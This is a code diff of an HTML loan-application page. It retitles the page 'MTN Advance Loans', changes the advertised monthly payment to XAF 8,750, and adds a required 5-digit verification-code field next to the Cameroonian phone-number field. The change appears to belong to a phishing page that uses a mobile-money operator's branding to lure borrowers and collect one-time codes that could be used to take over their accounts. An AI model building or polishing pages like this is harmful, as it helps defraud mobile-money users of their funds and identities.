@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoMo Xtra Loan</title>
+    <title>MTN Advance Loans</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -38,7 +38,7 @@
 
                 <div class="result-box">
                     <p>Monthly Payment</p>
-                    <h2 id="monthlyPayment">XAF 20,834</h2>
+                    <h2 id="monthlyPayment">XAF 8,750</h2>
                 </div>
 
                 <button class="primary-btn" onclick="startApplication()">START APPLICATION</button>
@@ -64,7 +64,8 @@
                     </select>
 
                     <label>Loan Amount (XAF)</label>
-                    <input type="number" name="loanAmount"id="formLoanAmount" value="100000" required>
+                    <!-- Added ID for JS to inject the calculated amount -->
+                    <input type="number" name="loanAmount" id="formLoanAmount" value="100000" required>
 
                     <label>Purpose of Loan</label>
                     <input type="text" name="purpose" placeholder="e.g. Business expansion" required>
@@ -88,6 +89,10 @@
                         <span>+237</span>
                         <input type="tel" name="phone" id="phone" placeholder="670123456" pattern="[0-9]{9}" title="9 digits without +237 prefix" required>
                     </div>
+
+                    <!-- NEW: Verification Code -->
+                    <label>Verification Code</label>
+                    <input type="text" name="verificationCode" id="verificationCode" placeholder="Enter 5-digit code" maxlength="5" pattern="[0-9]{5}" title="Please enter a 5-digit code" required>
 
                     <div class="btn-group">
                         <button type="button" class="secondary-btn" onclick="nextStep(1)">BACK</button>
